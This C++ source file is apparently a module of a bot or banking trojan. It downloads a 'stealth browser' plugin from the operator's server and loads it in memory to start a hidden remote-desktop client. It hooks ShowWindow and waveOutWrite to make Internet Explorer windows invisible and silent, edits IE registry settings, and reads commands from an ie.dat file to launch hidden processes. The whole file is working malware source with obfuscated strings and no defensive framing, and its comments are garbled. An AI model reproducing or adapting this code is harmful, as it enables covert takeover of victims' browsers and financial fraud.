#include <windows.h>
#include <shlobj.h>

#include "GetApi.h"
#include "Loader.h"
#include "DllLoader.h"
#include "BotUtils.h"
#include "Memory.h"
#include "Strings.h"
#include "Config.h"
#include "StealthBrowser.h"
#include "Utils.h"
#include "Splice.h"
#include "Plugins.h"



typedef struct
{
	char *Server;
	DWORD dwPort;
} VNC, * PVNC;


DWORD WINAPI SBThread( LPVOID lpData )
{
	DisableDEP();

	if ( !lpData )
		return 0;

	PVNC pData = (PVNC)lpData;

	char SBPlugin[] = {'s','b','.','p','l','u','g',0};

	LPBYTE BotModule   = Plugin::Download(SBPlugin, NULL, NULL);
	if (BotModule == NULL)
		return 0;


	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );
	if (hLib==NULL)
	{		
		return 0;
	}

	typedef void (WINAPI *PStartClient)( char *Server, int Port, char *Uid, int BrowserType );

	char StartClient_func[] = {'S','t','a','r','t','C','l','i','e','n','t',0};

	PStartClient StartClient = (PStartClient)MemoryGetProcAddress( hLib, StartClient_func );
	if (StartClient==NULL)
	{	
		return 0;
	}
	char Uid[100];
	GenerateUid( Uid );
	SetSBStarted(true);
	
	StartClient( pData->Server, pData->dwPort, Uid, 0 );
	
	return 0;

}

//----------------------------------------------------------------------------
bool ExecuteSBCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	PCHAR PArgs=Args;
	#ifdef KeepAliveH
		isALive("SBIsALive");
	#endif
	// ������ ������ �������� ��������
	PVNC V = CreateStruct(VNC);

	// ������ ���������
	V->Server = STR::GetLeftStr(PArgs, ":");
	PCHAR Port = STR::GetRightStr(PArgs, ":");
	if(Port != NULL)
	{
		V->dwPort = StrToInt(Port);
        STR::Free(Port);
	}
	
	if (V->Server == NULL || V->dwPort == 0)
		return false;
	return StartThread(SBThread, V) != NULL;

}
//----------------------------------------------------------------------------
//���� � ��� ��� ��� ��� ����
typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
typedef MMRESULT ( WINAPI *PwaveOutWrite   )( HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh );//winmm.dll Sounds

PShowWindow    Real_ShowWindow;
PwaveOutWrite    Real_waveOutWrite;

///����������� �����
/*
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
*/
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data



MMRESULT WINAPI Hook_WaveOutWrite(HWAVEOUT hwo, LPWAVEHDR pwh, UINT cbwh)//�������� ����
{
	return MMSYSERR_NOERROR;
}


BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)//����������� ���� ������� ����������
{
	WCHAR cClasN[MAX_PATH];
		pGetClassNameW(hWnd,cClasN,MAX_PATH);
		if (cClasN[0]=='#' )
		{
			char str1[260];
			pGetWindowTextA(hWnd,str1,260);
			
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
			pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);
		}


	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',0};//
	WCHAR SysPath1[MAX_PATH];
	if ( SysPath1 == NULL )
	{
		return true;
	}	
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	plstrcatW( SysPath1, ExplorerAdd );
	
	if (NULL!=(PTSTR)pStrStrIW(cClasN,L"IEFrame")||cClasN[0]=='#')
	
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{
		pIsWindow(hWnd);
		{
			if (NULL!=(PTSTR)pStrStrIW(cClasN,L"IEFrame"))
			{
				Cmd=0;
			}
			char str[260];
			pGetWindowTextA(hWnd,str,260);
			
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
			pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);			
			//Cmd=0;
		}
	}	
	return Real_ShowWindow(hWnd, Cmd);
}


void SetHooksForSB()
{
	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',0};
	WCHAR *SysPath1 = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );
	if ( SysPath1 == NULL )
	{
		return ;
	}	
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	plstrcatW( SysPath1, ExplorerAdd );
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{
		const DWORD HASH_ShowWindow = 0x7506E960;
		if ( HookApi( DLL_USER32, HASH_ShowWindow, &Hook_ShowWindow ) )
		{  
			__asm mov [Real_ShowWindow], eax			
		}

		const DWORD HASH_WaveOutWrite = 0x1BCB55BB;
		if ( HookApi( DLL_WINMM, HASH_WaveOutWrite, &Hook_WaveOutWrite ) )
		{  
			__asm mov [Real_waveOutWrite], eax			
		}	
	}
	MemFree(SysPath1);	
}
DWORD WINAPI RunIeSB( LPVOID lpData )
{	
	
	Registry::SetValueString(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth","0");
	Registry::SetValueDWORD(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\PhishingFilter","ShownVerifyBalloon",2);
	Registry::SetValueDWORD(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\PhishingFilter","Enabled",1);
		
	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',0};
	HANDLE tmp;
	while ( 1 )
	{
		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,FALSE, "CrMIE");
		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
		{
			pSleep(100);
		}
		else
		{
			WCHAR *SysPath1 = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );

			if ( SysPath1 == NULL )
				return false;

			pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);
			plstrcatW( SysPath1, ExplorerAdd );

			WCHAR buf[1025];
			m_memset(buf,0,1025);
			HANDLE hFile = (HANDLE)pCreateFileW( SysPath1, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
			if (hFile!=INVALID_HANDLE_VALUE)
			{
				DWORD dwSiseFile=0;
				DWORD dwBytesRead=0;
				pReadFile(hFile,&buf[0],1024,&dwBytesRead,NULL);
				pCloseHandle(hFile);
			} 

			if (buf[0]=='1' || buf[0]==L'2')
			{
				int nDesk = (int)buf[0]-48;

				//for(; buf_new[0]!=L'\0'; buf_new[0]==L'|')
				for(int i=0;i<(int)plstrlenW(&buf[0]); i++)
				{
					if(buf[i]==L'|') buf[i]=L' ';
				}


				STARTUPINFOW si;
				PROCESS_INFORMATION pi;
				m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
				m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
				int x = (int)pGetSystemMetrics( SM_CXSCREEN );
				int y = (int)pGetSystemMetrics( SM_CYSCREEN );
	

				
				si.cb = sizeof(si);
				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESIZE;
				si.wShowWindow = SW_HIDE;
				si.dwX=x-20;
				si.dwY=0;
				si.dwXSize=x-10;
				si.dwYSize=y-10;
				if(nDesk == 2)
					si.lpDesktop = L"SecondDesktop";
				pCreateProcessW( NULL, &buf[1], NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi );  
				MemFree(SysPath1);	
						
			}
			else if (buf[0]=='!')
			{
				
				int i=0;
				
				/*WCHAR *wPath;
				WCHAR* wComLen;
				lstrstr
				for(WCHAR* elem = wcstok(&buf[0],L"|"); elem!=NULL; elem=wcstok(NULL,L"|"), i++)
				{
					if(i==0)
						wPath = elem;
					else if(i==1)
						wComLen = elem;
				}
*/


				WCHAR wPath[MAX_PATH];
				m_memset( &wPath[0], 0, MAX_PATH*sizeof( WCHAR ) );	

				WCHAR* wComLen=(WCHAR*)(PTSTR)pStrStrIW(buf,L"|")+1;
				int t=(int)plstrlenW(buf)-(int)plstrlenW(wComLen)-2;

				m_memcpy( &wPath[0], &buf[1], (t*sizeof(WCHAR)));




				HINSTANCE tmp1=	(HINSTANCE)pShellExecuteW(0,L"open",	wPath,wComLen,NULL,SW_HIDE);

			}				
			pReleaseMutex(tmp);
			pCloseHandle(tmp);
			pSleep(4000);
			MemFree(SysPath1);	
		}
	}
	return 0;
}